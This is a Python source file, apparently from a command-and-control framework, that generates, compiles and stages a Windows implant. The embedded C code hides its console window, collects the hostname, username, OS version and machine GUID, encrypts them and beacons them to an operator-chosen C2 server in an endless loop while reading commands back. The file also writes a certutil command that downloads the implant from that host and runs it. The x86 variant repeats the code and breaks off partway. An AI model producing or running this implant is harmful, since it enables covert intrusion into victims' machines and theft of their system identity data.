# core/helpers/shellcode_agents.py
import os
import platform
import subprocess
import base64
import json

def generate_cmd_shellcodex64_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    
    # Extract campaign name from folder path
    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
    
    # Get the key from keys.json
    keys_file = os.path.join(campaign_folder, "keys.json")
    key_base64 = None
    
    # Check if keys.json exists and read the primary key
    if os.path.exists(keys_file):
        try:
            with open(keys_file, 'r') as f:
                keys_data = json.load(f)
                key_base64 = keys_data.get("primary")
        except Exception as e:
            print(f"Error loading keys file: {e}")
    
    if not key_base64:
        # Fallback to a default key if keys.json doesn't exist or primary key not found
        print(f"Warning: Could not find encryption key for campaign {campaign_name}. Using fallback key.")
        key_base64 = base64.b64encode(os.urandom(32)).decode('utf-8')
    
    # Generate C code for the shellcode with encryption support and system identity
    c_code = f"""
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <windows.h>
    #include <wininet.h>
    #include <wincrypt.h>

    #pragma comment(lib, "wininet.lib")
    #pragma comment(lib, "crypt32.lib")

    // Pre-shared key (base64)
    const char* KEY_BASE64 = "{key_base64}";
    
    // System identity collection structure
    typedef struct _SYSTEM_IDENTITY {{
        char hostname[256];
        char username[256];
        char os_version[256];
        char machine_guid[256];
        char mac_address[256];
        char client_id[40];
    }} SYSTEM_IDENTITY;

    SYSTEM_IDENTITY g_system_identity;
    char g_system_info_json[2048] = "{{}}";
    
    // Decode base64 to binary
    int base64_decode(const char* input, unsigned char** output) {{
        DWORD out_len = 0;
        if (!CryptStringToBinaryA(input, strlen(input), CRYPT_STRING_BASE64, NULL, &out_len, NULL, NULL)) {{
            return 0;
        }}
        
        *output = (unsigned char*)malloc(out_len);
        if (!*output) {{
            return 0;
        }}
        
        if (!CryptStringToBinaryA(input, strlen(input), CRYPT_STRING_BASE64, *output, &out_len, NULL, NULL)) {{
            free(*output);
            *output = NULL;
            return 0;
        }}
        
        return out_len;
    }}

    // Generate a UUID string for client identification
    void generate_uuid(char* buffer, size_t buffer_size) {{
        UUID uuid;
        UuidCreate(&uuid);
        
        unsigned char* str;
        UuidToStringA(&uuid, &str);
        
        strncpy(buffer, (char*)str, buffer_size - 1);
        buffer[buffer_size - 1] = '\\0';
        
        RpcStringFreeA(&str);
    }}

    // Collect system information
    void collect_system_info() {{
        // Clear the structure
        memset(&g_system_identity, 0, sizeof(SYSTEM_IDENTITY));
        
        // Get hostname
        DWORD size = sizeof(g_system_identity.hostname);
        GetComputerNameA(g_system_identity.hostname, &size);
        
        // Get username
        size = sizeof(g_system_identity.username);
        GetUserNameA(g_system_identity.username, &size);
        
        // Get OS version
        OSVERSIONINFOA osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
        
        #pragma warning(disable:4996)
        GetVersionExA(&osvi);
        #pragma warning(default:4996)
        
        snprintf(g_system_identity.os_version, sizeof(g_system_identity.os_version),
            "Windows %d.%d.%d", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
            
        // Get Machine GUID from registry
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\\\Microsoft\\\\Cryptography", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {{
            DWORD dwBufLen = sizeof(g_system_identity.machine_guid);
            if (RegQueryValueExA(hKey, "MachineGuid", NULL, NULL, (LPBYTE)g_system_identity.machine_guid, &dwBufLen) != ERROR_SUCCESS) {{
                strncpy(g_system_identity.machine_guid, "Unknown", sizeof(g_system_identity.machine_guid) - 1);
            }}
            RegCloseKey(hKey);
        }} else {{
            strncpy(g_system_identity.machine_guid, "Unknown", sizeof(g_system_identity.machine_guid) - 1);
        }}
        
        // Generate a unique client ID if not already done
        if (g_system_identity.client_id[0] == '\\0') {{
            generate_uuid(g_system_identity.client_id, sizeof(g_system_identity.client_id));
        }}
        
        // Create a JSON representation
        snprintf(g_system_info_json, sizeof(g_system_info_json),
            "{{\\\"Hostname\\\":\\\"%s\\\",\\\"Username\\\":\\\"%s\\\",\\\"OsVersion\\\":\\\"%s\\\","
            "\\\"MachineGuid\\\":\\\"%s\\\",\\\"ClientId\\\":\\\"%s\\\"}}",
            g_system_identity.hostname, g_system_identity.username, g_system_identity.os_version,
            g_system_identity.machine_guid, g_system_identity.client_id);
    }}

    // Function to encrypt data for C2 communication
    char* encrypt_data(const char* plaintext, unsigned char* key, int key_len) {{
        // Generate a random IV
        unsigned char iv[16];
        HCRYPTPROV hProv;
        if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {{
            return NULL;
        }}
        if (!CryptGenRandom(hProv, 16, iv)) {{
            CryptReleaseContext(hProv, 0);
            return NULL;
        }}
        CryptReleaseContext(hProv, 0);
        
        // Calculate plaintext length and padded length
        int plaintext_len = strlen(plaintext);
        int padded_len = ((plaintext_len + 15) / 16) * 16; // Pad to 16-byte blocks
        
        // Create padded buffer
        unsigned char* padded_data = (unsigned char*)malloc(padded_len);
        if (!padded_data) {{
            return NULL;
        }}
        
        // Copy data and add PKCS#7 padding
        memcpy(padded_data, plaintext, plaintext_len);
        int padding_len = padded_len - plaintext_len;
        memset(padded_data + plaintext_len, padding_len, padding_len);
        
        // Initialize AES encryption
        HCRYPTPROV hAesProvider;
        HCRYPTKEY hKey;
        
        if (!CryptAcquireContextA(&hAesProvider, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {{
            free(padded_data);
            return NULL;
        }}
        
        // Import the AES key
        HCRYPTHASH hHash;
        if (!CryptCreateHash(hAesProvider, CALG_SHA_256, 0, 0, &hHash)) {{
            CryptReleaseContext(hAesProvider, 0);
            free(padded_data);
            return NULL;
        }}
        
        if (!CryptHashData(hHash, key, key_len, 0)) {{
            CryptDestroyHash(hHash);
            CryptReleaseContext(hAesProvider, 0);
            free(padded_data);
            return NULL;
        }}
        
        if (!CryptDeriveKey(hAesProvider, CALG_AES_256, hHash, 0, &hKey)) {{
            CryptDestroyHash(hHash);
            CryptReleaseContext(hAesProvider, 0);
            free(padded_data);
            return NULL;
        }}
        
        CryptDestroyHash(hHash);
        
        // Set the IV
        DWORD mode = CRYPT_MODE_CBC;
        if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0) ||
            !CryptSetKeyParam(hKey, KP_IV, iv, 0)) {{
            CryptDestroyKey(hKey);
            CryptReleaseContext(hAesProvider, 0);
            free(padded_data);
            return NULL;
        }}
        
        // Encrypt the data in place
        unsigned char* encrypted_data = (unsigned char*)malloc(padded_len);
        if (!encrypted_data) {{
            CryptDestroyKey(hKey);
            CryptReleaseContext(hAesProvider, 0);
            free(padded_data);
            return NULL;
        }}
        
        memcpy(encrypted_data, padded_data, padded_len);
        DWORD encrypted_len = padded_len;
        
        if (!CryptEncrypt(hKey, 0, TRUE, 0, encrypted_data, &encrypted_len, padded_len)) {{
            CryptDestroyKey(hKey);
            CryptReleaseContext(hAesProvider, 0);
            free(padded_data);
            free(encrypted_data);
            return NULL;
        }}
        
        // Combine IV and encrypted data
        unsigned char* result = (unsigned char*)malloc(16 + encrypted_len);
        if (!result) {{
            CryptDestroyKey(hKey);
            CryptReleaseContext(hAesProvider, 0);
            free(padded_data);
            free(encrypted_data);
            return NULL;
        }}
        
        memcpy(result, iv, 16);
        memcpy(result + 16, encrypted_data, encrypted_len);
        
        // Convert to Base64
        DWORD base64_len = 0;
        CryptBinaryToStringA(result, 16 + encrypted_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64_len);
        char* base64_result = (char*)malloc(base64_len + 1);
        
        if (!base64_result) {{
            CryptDestroyKey(hKey);
            CryptReleaseContext(hAesProvider, 0);
            free(padded_data);
            free(encrypted_data);
            free(result);
            return NULL;
        }}
        
        if (!CryptBinaryToStringA(result, 16 + encrypted_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, 
                                 base64_result, &base64_len)) {{
            CryptDestroyKey(hKey);
            CryptReleaseContext(hAesProvider, 0);
            free(padded_data);
            free(encrypted_data);
            free(result);
            free(base64_result);
            return NULL;
        }}
        
        // Clean up
        CryptDestroyKey(hKey);
        CryptReleaseContext(hAesProvider, 0);
        free(padded_data);
        free(encrypted_data);
        free(result);
        
        return base64_result;
    }}

    // Function to decrypt data from C2 response
    char* decrypt_data(const char* encrypted_base64, unsigned char* key, int key_len) {{
        // Decode base64
        DWORD binary_len = 0;
        if (!CryptStringToBinaryA(encrypted_base64, 0, CRYPT_STRING_BASE64, NULL, &binary_len, NULL, NULL)) {{
            return NULL;
        }}
        
        unsigned char* binary_data = (unsigned char*)malloc(binary_len);
        if (!binary_data) {{
            return NULL;
        }}
        
        if (!CryptStringToBinaryA(encrypted_base64, 0, CRYPT_STRING_BASE64, binary_data, &binary_len, NULL, NULL)) {{
            free(binary_data);
            return NULL;
        }}
        
        // Extract IV and encrypted data
        if (binary_len <= 16) {{
            free(binary_data);
            return NULL;
        }}
        
        unsigned char* iv = binary_data;
        unsigned char* encrypted_data = binary_data + 16;
        DWORD encrypted_len = binary_len - 16;
        
        // Initialize AES decryption
        HCRYPTPROV hAesProvider;
        HCRYPTKEY hKey;
        
        if (!CryptAcquireContextA(&hAesProvider, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {{
            free(binary_data);
            return NULL;
        }}
        
        // Import the AES key
        HCRYPTHASH hHash;
        if (!CryptCreateHash(hAesProvider, CALG_SHA_256, 0, 0, &hHash)) {{
            CryptReleaseContext(hAesProvider, 0);
            free(binary_data);
            return NULL;
        }}
        
        if (!CryptHashData(hHash, key, key_len, 0)) {{
            CryptDestroyHash(hHash);
            CryptReleaseContext(hAesProvider, 0);
            free(binary_data);
            return NULL;
        }}
        
        if (!CryptDeriveKey(hAesProvider, CALG_AES_256, hHash, 0, &hKey)) {{
            CryptDestroyHash(hHash);
            CryptReleaseContext(hAesProvider, 0);
            free(binary_data);
            return NULL;
        }}
        
        CryptDestroyHash(hHash);
        
        // Set the IV
        DWORD mode = CRYPT_MODE_CBC;
        if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0) ||
            !CryptSetKeyParam(hKey, KP_IV, iv, 0)) {{
            CryptDestroyKey(hKey);
            CryptReleaseContext(hAesProvider, 0);
            free(binary_data);
            return NULL;
        }}
        
        // Create buffer for decryption
        unsigned char* decrypted_data = (unsigned char*)malloc(encrypted_len);
        if (!decrypted_data) {{
            CryptDestroyKey(hKey);
            CryptReleaseContext(hAesProvider, 0);
            free(binary_data);
            return NULL;
        }}
        
        memcpy(decrypted_data, encrypted_data, encrypted_len);
        DWORD decrypted_len = encrypted_len;
        
        // Perform decryption
        if (!CryptDecrypt(hKey, 0, TRUE, 0, decrypted_data, &decrypted_len)) {{
            CryptDestroyKey(hKey);
            CryptReleaseContext(hAesProvider, 0);
            free(binary_data);
            free(decrypted_data);
            return NULL;
        }}
        
        // Remove padding
        DWORD padding_len = decrypted_data[decrypted_len - 1];
        if (padding_len > 16 || padding_len > decrypted_len) {{
            CryptDestroyKey(hKey);
            CryptReleaseContext(hAesProvider, 0);
            free(binary_data);
            free(decrypted_data);
            return NULL;
        }}
        
        decrypted_data[decrypted_len - padding_len] = '\\0';
        
        // Create result string
        char* result = _strdup((char*)decrypted_data);
        
        // Clean up
        CryptDestroyKey(hKey);
        CryptReleaseContext(hAesProvider, 0);
        free(binary_data);
        free(decrypted_data);
        
        return result;
    }}

    void executeShellcode() {{
        // Setting up connectivity to C2
        HINTERNET hInternet = InternetOpenA("ShellcodeAgent/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hInternet == NULL) {{
            return;
        }}
        
        // Make sure system info is collected
        collect_system_info();
        
        // Format C2 server URL
        char serverUrl[256];
        sprintf(serverUrl, "{('https' if ssl else 'http')}://{host}:{port}/beacon");
        
        // Get the encryption key
        unsigned char* key = NULL;
        int key_len = base64_decode(KEY_BASE64, &key);
        
        if (key == NULL || key_len != 32) {{
            InternetCloseHandle(hInternet);
            if (key) free(key);
            return;
        }}
        
        // Encrypt system info for the header
        char* encrypted_system_info = encrypt_data(g_system_info_json, key, key_len);
        
        if (encrypted_system_info) {{
            // Prepare headers
            char headers[4096];
            sprintf(headers, "X-System-Info: %s\\r\\nX-Client-ID: %s\\r\\n", 
                    encrypted_system_info, g_system_identity.client_id);
            
            // Make the HTTP request
            HINTERNET hRequest = InternetOpenUrlA(hInternet, serverUrl, headers, strlen(headers),
                                               INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
            
            if (hRequest) {{
                // Read the response (which might contain commands)
                char buffer[8192];
                DWORD bytesRead = 0;
                BOOL success = InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead);
                
                if (success && bytesRead > 0) {{
                    // Null-terminate the response
                    buffer[bytesRead] = '\\0';
                    
                    // Decrypt and process commands
                    if (bytesRead > 0) {{
                        char* decrypted_commands = decrypt_data(buffer, key, key_len);
                        
                        if (decrypted_commands && strlen(decrypted_commands) > 0) {{
                            // Here you would parse and execute commands
                            // For now, we'll just log that we received commands
                            OutputDebugStringA("Received commands from C2");
                            OutputDebugStringA(decrypted_commands);
                            
                            free(decrypted_commands);
                        }}
                    }}
                }}
                
                InternetCloseHandle(hRequest);
            }}
            
            free(encrypted_system_info);
        }}
        
        free(key);
        InternetCloseHandle(hInternet);
        
        // Sleep for a while (beacon interval)
        Sleep(5000);
    }}

    int main() {{
        // Hide console window if not in debug mode
        #ifndef DEBUG
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        #endif
        
        // Initialize system identity
        collect_system_info();
        
        // Initialize encryption key
        unsigned char* key = NULL;
        int key_len = base64_decode(KEY_BASE64, &key);
        if (key_len != 32) {{
            // Error handling
            if (key) free(key);
            return 1;
        }}
        
        // Execute shellcode logic in a loop
        while (1) {{
            executeShellcode();
        }}
        
        // Cleanup (never reached in this case)
        free(key);
        return 0;
    }}
    """
    
    # Save the C file
    c_file_path = os.path.join(agents_folder, "shellcode_x64.c")
    with open(c_file_path, "w") as f:
        f.write(c_code)
    
    # Compile the shellcode if system has a C compiler
    exe_path = os.path.join(agents_folder, "shellcode_x64.exe")
    compile_result = "Shellcode C file generated. Compilation "
    
    try:
        if platform.system() == "Windows":
            compiler_command = f"cl {c_file_path} /Fe:{exe_path} /O2 /link rpcrt4.lib"
            compilation = subprocess.run(compiler_command, shell=True, capture_output=True, text=True)
            if compilation.returncode == 0:
                compile_result += "successful."
            else:
                compile_result += f"failed: {compilation.stderr}"
        else:
            # For cross-compilation on non-Windows platforms
            compiler_command = f"x86_64-w64-mingw32-gcc {c_file_path} -o {exe_path} -lwininet -lcrypt32 -lrpcrt4 -s -O2"
            compilation = subprocess.run(compiler_command, shell=True, capture_output=True, text=True)
            if compilation.returncode == 0:
                compile_result += "successful."
            else:
                compile_result += "failed. You may need to install mingw-w64 for cross-compilation."
    except Exception as e:
        compile_result += f"failed: {str(e)}"
    
    # Generate a cmd command to download and execute the shellcode
    http = "https" if ssl else "http"
    cmd_payload = f"cmd.exe /c certutil -urlcache -split -f {http}://{host}:{port}/shellcode_x64.exe %TEMP%\\sc.exe && %TEMP%\\sc.exe"
    
    # Save full payload information
    result = f"CMD Shellcodex64 agent generated:\n\n1. C source saved to: {c_file_path}\n2. {compile_result}\n3. Execution command:\n{cmd_payload}\n4. Uses encryption with campaign-specific key\n5. Includes system identity collection and verification"
    with open(os.path.join(agents_folder, "cmd_shellcodex64.txt"), "w") as f:
        f.write(result)
    
    return result

def generate_cmd_shellcodex86_str(host, port, ssl, campaign_folder):
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    
    # Extract campaign name from folder path
    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
    
    # Get the key from keys.json
    keys_file = os.path.join(campaign_folder, "keys.json")
    key_base64 = None
    
    # Check if keys.json exists and read the primary key
    if os.path.exists(keys_file):
        try:
            with open(keys_file, 'r') as f:
                keys_data = json.load(f)
                key_base64 = keys_data.get("primary")
        except Exception as e:
            print(f"Error loading keys file: {e}")
    
    if not key_base64:
        # Fallback to a default key if keys.json doesn't exist or primary key not found
        print(f"Warning: Could not find encryption key for campaign {campaign_name}. Using fallback key.")
        key_base64 = base64.b64encode(os.urandom(32)).decode('utf-8')
    
    # Generate C code for the shellcode with encryption support and system identity
    c_code = f"""
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <windows.h>
    #include <wininet.h>
    #include <wincrypt.h>

    #pragma comment(lib, "wininet.lib")
    #pragma comment(lib, "crypt32.lib")

    // Pre-shared key (base64)
    const char* KEY_BASE64 = "{key_base64}";
    
    // System identity collection structure
    typedef struct _SYSTEM_IDENTITY {{
        char hostname[256];
        char username[256];
        char os_version[256];
        char machine_guid[256];
        char mac_address[256];
        char client_id[40];
    }} SYSTEM_IDENTITY;

    SYSTEM_IDENTITY g_system_identity;
    char g_system_info_json[2048] = "{{}}";
    
    // Decode base64 to binary
    int base64_decode(const char* input, unsigned char** output) {{
        DWORD out_len = 0;
        if (!CryptStringToBinaryA(input, strlen(input), CRYPT_STRING_BASE64, NULL, &out_len, NULL, NULL)) {{
            return 0;
        }}
        
        *output = (unsigned char*)malloc(out_len);
        if (!*output) {{
            return 0;
        }}
        
        if (!CryptStringToBinaryA(input, strlen(input), CRYPT_STRING_BASE64, *output, &out_len, NULL, NULL)) {{
            free(*output);
            *output = NULL;
            return 0;
        }}
        
        return out_len;
    }}

    // Generate a UUID string for client identification
    void generate_uuid(char* buffer, size_t buffer_size) {{
        UUID uuid;
        UuidCreate(&uuid);
        
        unsigned char* str;
        UuidToStringA(&uuid, &str);
        
        strncpy(buffer, (char*)str, buffer_size - 1);
        buffer[buffer_size - 1] = '\\0';
        
        RpcStringFreeA(&str);
    }}

    // Collect system information
    void collect_system_info() {{
        // Clear the structure
        memset(&g_system_identity, 0, sizeof(SYSTEM_IDENTITY));
        
        // Get hostname
        DWORD size = sizeof(g_system_identity.hostname);
        GetComputerNameA(g_system_identity.hostname, &size);
        
        // Get username
        size = sizeof(g_system_identity.username);
        GetUserNameA(g_system_identity.username, &size);
        
        // Get OS version
        OSVERSIONINFOA osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
        
        #pragma warning(disable:4996)
        GetVersionExA(&osvi);
        #pragma warning(default:4996)
        
        snprintf(g_system_identity.os_version, sizeof(g_system_identity.os_version),
            "Windows %d.%d.%d", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
            
        // Get Machine GUID from registry
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\\\Microsoft\\\\Cryptography", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {{
            DWORD dwBufLen = sizeof(g_system_identity.machine_guid);
            if (RegQueryValueExA(hKey, "MachineGuid", NULL, NULL, (LPBYTE)g_system_identity.machine_guid, &dwBufLen) != ERROR_SUCCESS) {{
                strncpy(g_system_identity.machine_guid, "Unknown", sizeof(g_system_identity.machine_guid) - 1);
            }}
            RegCloseKey(hKey);
        }} else {{
            strncpy(g_system_identity.machine_guid, "Unknown", sizeof(g_system_identity.machine_guid) - 1);
        }}
        
        // Generate a unique client ID if not already done
        if (g_system_identity.client_id[0] == '\\0') {{
            generate_uuid(g_system_identity.client_id, sizeof(g_system_identity.client_id));
        }}
        
        // Create a JSON representation
        snprintf(g_system_info_json, sizeof(g_system_info_json),
            "{{\\\"Hostname\\\":\\\"%s\\\",\\\"Username\\\":\\\"%s\\\",\\\"OsVersion\\\":\\\"%s\\\","
            "\\\"MachineGuid\\\":\\\"%s\\\",\\\"ClientId\\\":\\\"%s\\\"}}",
            g_system_identity.hostname, g_system_identity.username, g_system_identity.os_version,
            g_system_identity.machine_guid, g_system_identity.client_id);
    }}

    // Function to encrypt data for C2 communication
    char* encrypt_data(const char* plaintext, unsigned char* key, int key_len) {{
        // Generate a random IV
        unsigned char iv[16];
        HCRYPTPROV hProv;
        if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {{
            return NULL;
        }}
        if (!CryptGenRandom(hProv, 16, iv)) {{
            CryptReleaseContext(hProv, 0);
            return NULL;
        }}
        CryptReleaseContext(hProv, 0);
        
        // Calculate plaintext length and padded length
        int plaintext_len = strlen(plaintext);
        int padded_len = ((plaintext_len + 15) / 16) * 16; // Pad to 16-byte blocks
        
        // Create padded buffer
        unsigned char* padded_data = (unsigned char*)malloc(padded_len);
        if (!padded_data) {{
            return NULL;
        }}
        
        // Copy data and add PKCS#7 padding
        memcpy(padded_data, plaintext, plaintext_len);
        int padding_len = padded_len - plaintext_len;
        memset(padded_data + plaintext_len, padding_len, padding_len);
        
        // Initialize AES encryption
        HCRYPTPROV hAesProvider;
        HCRYPTKEY hKey;
        
        if (!CryptAcquireContextA(&hAesProvider, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {{
            free(padded_data);
            return NULL;
        }}
        
        // Import the AES key
        HCRYPTHASH hHash;
        if (!CryptCreateHash(hAesProvider, CALG_SHA_256, 0, 0, &hHash)) {{
            CryptReleaseContext(hAesProvider, 0);
            free(padded_data);
            return NULL;
        }}
        
        if (!CryptHashData(hHash, key, key_len, 0)) {{
            CryptDestroyHash(hHash);
            CryptReleaseContext(hAesProvider, 0);
            free(padded_data);
            return NULL;
        }}
        
        if (!CryptDeriveKey(hAesProvider, CALG_AES_256, hHash, 0, &hKey)) {{
            CryptDestroyHash(hHash);
            CryptReleaseContext(hAesProvider, 0);
            free(padded_data);
            return NULL;
        }}
        
        CryptDestroyHash(hHash);
        
        // Set the IV
        DWORD mode = CRYPT_MODE_CBC;
        if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0) ||
            !CryptSetKeyParam(hKey, KP_IV, iv, 0)) {{
            CryptDestroyKey(hKey);
            CryptReleaseContext(hAesProvider, 0);
            free(padded_data);
            return NULL;
        }}
        
        // Encrypt the data in place
        unsigned char* encrypted_data = (unsigned char*)malloc(padded_len);
        if (!encrypted_data) {{
            CryptDestroyKey(hKey);
            CryptReleaseContext(hAesProvider, 0);
            free(padded_data);
            return NULL;
        }}
        
        memcpy(encrypted_data, padded_data, padded_len);
        DWORD encrypted_len = padded_len;
        
        if (!CryptEncrypt(hKey, 0, TRUE, 0, encrypted_data, &encrypted_len, padded_len)) {{
            CryptDestroyKey(hKey);
            CryptReleaseContext(hAesProvider, 0);
            free(padded_data);
            free(encrypted_data);
            return NULL;
        }}
        
        // Combine IV and encrypted data
        unsigned char* result = (unsigned char*)malloc(16 + encrypted_len);
        if (!result) {{
            CryptDestroyKey(hKey);
            CryptReleaseContext(hAesProvider, 0);
            free(padded_data);
            free(encrypted_data);
            return NULL;
        }}
        
        memcpy(result, iv, 16);
        memcpy(result + 16, encrypted_data, encrypted_len);
        
        // Convert to Base64
        DWORD base64_len = 0;
        CryptBinaryToStringA(result, 16 + encrypted_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64_len);
        char* base64_result = (char*)malloc(base64_len + 1);
        
        if (!base64_result) {{
            CryptDestroyKey(hKey);
            CryptReleaseContext(hAesProvider, 0);
            free(padded_data);
            free(encrypted_data);
            free(result);
            return NULL;
        }}
        
        if (!CryptBinaryToStringA(result, 16 + encrypted_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, 
                                 base64_result, &base64_len)) {{
            CryptDestroyKey(hKey);
            CryptReleaseContext(hAesProvider, 0);
            free(padded_data);
            free(encrypted_data);
            free(result);
            free(base64_result);
            return NULL;
        }}
        
        // Clean up
        CryptDestroyKey(hKey);
        CryptReleaseContext(hAesProvider, 0);
        free(padded_data);
        free(encrypted_data);
        free(result);
        
        return base64_result;
    }}

    // Function to decrypt data from C2 response
    char* decrypt_data(const char* encrypted_base64, unsigned char* key, int key_len) {{
        // Decode base64
        DWORD binary_len = 0;
        if (!CryptStringToBinaryA(encrypted_base64, 0, CRYPT_STRING_BASE64, NULL, &binary_len, NULL, NULL)) {{
            return NULL;
        }}
        
        unsigned char* binary_data = (unsigned char*)malloc(binary_len);
        if (!binary_data) {{
            return NULL;
        }}
        
        if (!CryptStringToBinaryA(encrypted_base64, 0, CRYPT_STRING_BASE64, binary_data, &binary_len, NULL, NULL)) {{
            free(binary_data);
            return NULL;
        }}
        
        // Extract IV and encrypted data
        if (binary_len <= 16) {{
            free(binary_data);
            return NULL;
        }}
        
        unsigned char* iv = binary_data;
        unsigned char* encrypted_data = binary_data + 16;
        DWORD encrypted_len = binary_len - 16;
        
        // Initialize AES decryption
        HCRYPTPROV hAesProvider;
        HCRYPTKEY hKey;
        
        if (!CryptAcquireContextA(&hAesProvider, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {{
            free(binary_data);
            return NULL;
        }}
        
        // Import the AES key
        HCRYPTHASH hHash;
        if (!CryptCreateHash(hAesProvider, CALG_SHA_256, 0, 0, &hHash)) {{
            CryptReleaseContext(hAesProvider, 0);
            free(binary_data);
            return NULL;
        }}
        
        if (!CryptHashData(hHash, key, key_len, 0)) {{
            CryptDestroyHash(hHash);
            CryptReleaseContext(hAesProvider, 0);
            free(binary_data);
            return NULL;
        }}
        
        if (!CryptDeriveKey(hAesProvider, CALG_AES_256, hHash, 0, &hKey)) {{
            CryptDestroyHash(hHash);
            CryptReleaseContext(hAesProvider, 0);
            free(binary_data);
            return NULL;
        }}
        
        CryptDestroyHash(hHash);
        
        // Set the IV
        DWORD mode = CRYPT_MODE_CBC;
        if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0) ||
            !CryptSetKeyParam(hKey, KP_IV, iv, 0)) {{
            CryptDestroyKey(hKey);
            CryptReleaseContext(hAesProvider, 0);
            free(binary_data);
            return NULL;
        }}
        
        // Create buffer for decryption
        unsigned char* decrypted_data = (unsigned char*)malloc(encrypted_len);
        if (!decrypted_data) {{
            CryptDestroyKey(hKey);
            CryptReleaseContext(hAesProvider, 0);
            free(binary_data);
            return NULL;
        }}
        
        memcpy(decrypted_data, encrypted_data, encrypted_len);
        DWORD decrypted_len = encrypted_len;
        
        // Perform decryption
        if (!CryptDecrypt(hKey, 0, TRUE, 0, decrypted_data, &decrypted_len)) {{
            CryptDestroyKey(hKey);
            CryptReleaseContext(hAesProvider, 0);
            free(binary_data);
            free(decrypted_data);
            return NULL;
        }}
        
        // Remove padding
        DWORD padding_len = decrypted_data[decrypted_len - 1];
        if (padding_len > 16 || padding_len > decrypted_len) {{
            CryptDestroyKey(hKey);
            CryptReleaseContext(hAesProvider, 0);
            free(binary_data);
            free(decrypted_data);
            return NULL;
        }}
        
        decrypted_data[decrypted_len - padding_len] = '\\0';
        
        // Create result string
        char* result = _strdup((char*)decrypted_data);
        
        // Clean up
        CryptDestroyKey(hKey);
        CryptReleaseContext(hAesProvider, 0);
        free(binary_data);
        free(decrypted_data);
        
        return result;
    }}

    void executeShellcode() {{
        // Setting up connectivity to C2
        HINTERNET hInternet = InternetOpenA("ShellcodeAgent/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hInternet == NULL) {{
            return;
        }}
        
        // Make sure system info is collected
        collect_system_info();
        
        // Format C2 server URL
        char serverUrl[256];
        sprintf(serverUrl, "{('https' if ssl else 'http')}://{host}:{port}/beacon");
        
        // Get the encryption key
        unsigned char* key = NULL;
        int key_len = base64_decode(KEY_BASE64, &key);
        
        if (key == NULL || key_len != 32) {{
            InternetCloseHandle(hInternet);
            if (key) free(key);
            return;
        }}
        
        // Encrypt system info for the header
        char* encrypted_system_info = encrypt_data(g_system_info_json, key, key_len);
        
        if (encrypted_system_info) {{
            // Prepare headers
            char headers[4096];
            sprintf(headers, "X-System-Info: %s\\r\\nX-Client-ID: %s\\r\\n", 
                    encrypted_system_info, g_system_identity.client_id);
            
            // Make the HTTP request
            HINTERNET hRequest = InternetOpenUrlA(hInternet, serverUrl, headers, strlen(headers),
                                               INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
            
            if (hRequest) {{
                // Read the response (which might contain commands)
                char buffer[8192];
                DWORD bytesRead = 0;
                BOOL success = InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead);
                
                if (success && bytesRead > 0) {{
                    // Null-terminate the response
                    buffer[bytesRead] = '\\0';
                    
                    // Decrypt and process commands
                    if (bytesRead > 0) {{
                        char* decrypted_commands = decrypt_data(buffer, key, key_len);
                        
                        if (decrypted_commands && strlen(decrypted_commands) > 0) {{
                            // Here you would parse and execute commands
                            // For now, we'll just log that we received commands
                            OutputDebugStringA("Received commands from C2");
                            OutputDebugStringA(decrypted_commands);
                            
                            free(decrypted_commands);
                        }}
                    }}
                }}
                
                InternetCloseHandle(hRequest);
            }}
            
            free(encrypted_system_info);
        }}
        
        free(key);
        InternetCloseHandle(hInternet);
        
        // Sleep for a while (beacon interval)
        Sleep(5000);
    }}

    int main() {{
        // Hide console window if not in debug mode
        #ifndef DEBUG
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        #endif
        
        // Initialize system identity
        collect_system_info();
        
        // Initialize encryption key
        unsigned char* key = NULL;
        int key_len = base64_decode(KEY_BASE64, &key);
        if (key_len != 32) {{
